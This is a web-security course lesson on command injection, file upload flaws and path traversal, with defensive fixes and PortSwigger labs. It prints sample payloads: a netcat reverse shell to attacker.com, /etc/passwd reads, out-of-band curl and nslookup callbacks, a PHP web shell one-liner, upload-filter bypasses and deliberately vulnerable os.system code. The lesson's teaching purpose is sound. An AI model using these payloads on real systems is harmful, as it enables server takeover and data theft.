# Command injection & file upload flaws

Two more injection-family bugs — both frequently lead to the most severe possible outcome in web security: **full remote code execution (RCE)** on the server itself.

## Command injection

### The core idea

Just like SQL injection tricks a database interpreter, **command injection** tricks the operating system's shell interpreter — happening whenever an application passes user input into a system command without proper isolation.

```python
# VULNERABLE — user input concatenated into a shell command:
import os
hostname = request.form["hostname"]
os.system(f"ping -c 4 {hostname}")
```

This looks harmless — a "ping this host" feature. But shells understand special characters that chain multiple commands together:

```
hostname: example.com; cat /etc/passwd
hostname: example.com && whoami
hostname: example.com | nc attacker.com 4444 -e /bin/sh
```

The resulting shell command becomes:

```bash
ping -c 4 example.com; cat /etc/passwd
```

The `;` separates two commands — the shell runs `ping`, **then** runs `cat /etc/passwd`, printing the entire contents of a sensitive system file, invisible to the developer who only intended to allow pinging a hostname.

### Shell metacharacters worth recognising

| Character | Effect |
|---|---|
| `;` | Run a second command regardless of the first's result |
| `&&` | Run the second command only if the first succeeds |
| `\|\|` | Run the second command only if the first fails |
| `\|` | Pipe the first command's output into the second |
| `` ` `` or `$()` | Command substitution — run and inline the result |
| `&` | Run in background |

### Finding command injection

Look for any feature that plausibly shells out to a system tool: ping/traceroute utilities, image conversion, PDF generation, file compression, DNS lookup tools, network diagnostics. Try:

```
; whoami
| whoami
` whoami `
$(whoami)
& whoami &
```

If any variant causes an unexpected delay, error, or leaks unexpected output, you've likely found injectable command execution.

### Blind command injection

Just like blind SQLi, sometimes there's no visible output — but you can still confirm execution using **time delays** or **out-of-band callbacks**:

```
; sleep 10
$(sleep 10)
; curl http://your-server.com/confirmed
; nslookup $(whoami).your-collaborator-domain.com
```

Burp's **Collaborator** feature (Professional edition) automates exactly this out-of-band detection pattern — generating unique callback domains and monitoring for any DNS/HTTP interaction, proving execution even with zero visible output.

### The fix

- **Avoid shelling out entirely** wherever possible — use language-native libraries instead of invoking system commands (e.g., a proper DNS library instead of shelling out to `nslookup`).
- If a system command is genuinely unavoidable, use APIs that pass arguments as a **list**, never a single interpolated string:

```python
# SAFE — arguments passed as a list, not through a shell:
import subprocess
hostname = request.form["hostname"]
result = subprocess.run(["ping", "-c", "4", hostname], capture_output=True)
```

Passing arguments as a list (rather than a single shell-interpreted string) means metacharacters like `;` and `|` are treated as **literal characters** in the hostname argument, not as shell syntax — structurally similar to how parameterised queries defeat SQLi.

- **Strict allowlisting** of expected input format (e.g., validate the input actually looks like a hostname/IP before using it at all) as an additional layer.

## File upload vulnerabilities

### Why upload features are so dangerous

Any feature letting users upload files — profile pictures, documents, attachments — is a direct pathway for an attacker to place **their own code** onto your server, if not properly restricted.

### The classic attack: uploading a web shell

If a server accepts file uploads and doesn't properly validate file type, an attacker uploads a script disguised as an image:

```php
<?php system($_GET['cmd']); ?>
```

Saved as `shell.php` (or disguised as `shell.php.jpg`, `shell.phP`, or using other extension tricks to slip past weak filters). If the attacker can then **access that uploaded file directly via URL**, and the server executes PHP files in that directory:

```
http://target.com/uploads/shell.php?cmd=whoami
```

...they now have arbitrary command execution on the server, exactly like command injection — but delivered via file upload rather than a form field.

### Common (weak) defences and their bypasses

| Weak defence | Common bypass |
|---|---|
| Checking file extension (`.jpg` only) | Rename to `shell.php.jpg`, or use alternate PHP extensions (`.phtml`, `.php5`) some servers still execute |
| Checking `Content-Type` header | Attacker fully controls this header — trivially spoofed in the raw request via Burp |
| Checking for image "magic bytes" at file start | Prepend valid image magic bytes to a file that's still a working PHP script underneath — some parsers only check the very first few bytes |
| Client-side JS validation | Bypassed entirely — just intercept and modify the request in Burp, exactly like the client-vs-server lesson (Path 05.3) taught |

### The correct defensive approach

- **Store uploads outside the webroot**, or on entirely separate, non-execution-capable storage (e.g., a dedicated object storage bucket) so uploaded files can **never be directly executed** as server-side code, no matter what they contain.
- **Rename uploaded files** to random, server-generated names — never trust or preserve the original filename.
- **Validate file content properly** — actually parse and re-encode images (e.g., open with an image library and re-save), rather than just checking headers/extensions, since a genuine re-encode strips out any embedded non-image payload.
- **Restrict execution permissions** on the upload directory at the OS/web-server level, regardless of file content.
- **Set a strict `Content-Type`/`Content-Disposition`** on serving uploaded files so browsers download rather than execute/render them where inappropriate.
- **Virus/malware scanning** on upload as an additional layer for user-generated content platforms.

## Path traversal — the upload feature's other risk

Related to, but distinct from, uploading malicious file *content*, an insecure upload feature can also fail on the **filename** itself. If the server naively uses an attacker-supplied filename to decide where to save a file, a filename like `../../etc/cron.d/malicious` (a **path traversal** or "directory traversal" payload, using `../` to climb out of the intended upload directory) can let an attacker write files to arbitrary locations on the filesystem entirely — including sensitive locations like scheduled-task directories or web-accessible folders outside the intended uploads path. The same `../` technique also shows up independently of uploads, in any feature that reads a file based on user input (`GET /download?file=../../etc/passwd`), which is why filename and file-path handling deserves the same never-trust-the-client discipline as every other input in this lesson — validate that the resolved path still sits inside the intended directory before ever touching the filesystem.

## Where these fit in the OWASP Top 10

Both command injection and unrestricted file upload fall under **A03: Injection** and **A05: Security Misconfiguration** territory from Path 11.1 — different delivery mechanisms, same underlying theme: **untrusted input being interpreted somewhere it shouldn't be trusted.**

## 🧪 Lab — PortSwigger command injection & file upload labs

1. Work through [PortSwigger's OS command injection labs](https://portswigger.net/web-security/os-command-injection) — practise both visible and blind detection techniques.
2. Then work through [PortSwigger's File upload vulnerabilities labs](https://portswigger.net/web-security/file-upload) — practise the extension/content-type/magic-bytes bypass techniques described above, in a safe, legal, hosted environment.

These labs let you safely practise techniques that would otherwise require setting up your own deliberately-vulnerable server — exactly the kind of hands-on repetition that builds real skill.

:::challenge Test yourself
A file upload feature checks the `Content-Type` header to ensure only `image/jpeg` or `image/png` are accepted. Why is this check, on its own, essentially worthless as a security control?

<details><summary>Show answer</summary>The <code>Content-Type</code> header is set entirely by the <strong>client</strong> (the browser or, more relevantly, an attacker using a proxy like Burp) and can be changed to any arbitrary value regardless of the file's actual content. An attacker simply intercepts the upload request and sets <code>Content-Type: image/jpeg</code> while the file body itself remains a fully functional malicious script — the header claims one thing while the bytes are something else entirely.</details>
:::

## Key terms

- **Command injection** — attacker input executed as an OS shell command.
- **Shell metacharacters** — `;`, `&&`, `\|`, `` ` ``, `$()` — used to chain or substitute commands.
- **Blind command injection** — confirmed via time delays or out-of-band callbacks rather than visible output.
- **Web shell** — a malicious script uploaded to gain remote command execution via file upload.
- **Magic bytes** — the file-type-identifying bytes at the start of a file, sometimes spoofed.

## Recap

- Command injection tricks the OS shell into running attacker commands via unsanitised input passed to system calls.
- Pass command arguments as lists, never interpolated shell strings, to structurally prevent injection.
- File upload flaws let attackers plant executable code on the server if type/content isn't properly validated.
- Weak client-controlled checks (extension, Content-Type, shallow magic-byte checks) are all bypassable.
- Store uploads outside the webroot, rename files, and properly re-encode/validate content as real defences.

???refs
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) — free hands-on labs.
- [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload) — free hands-on labs.
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
???

**Next up →** [XXE — XML External Entity Injection](#/lesson/11-web-security/xxe-injection)
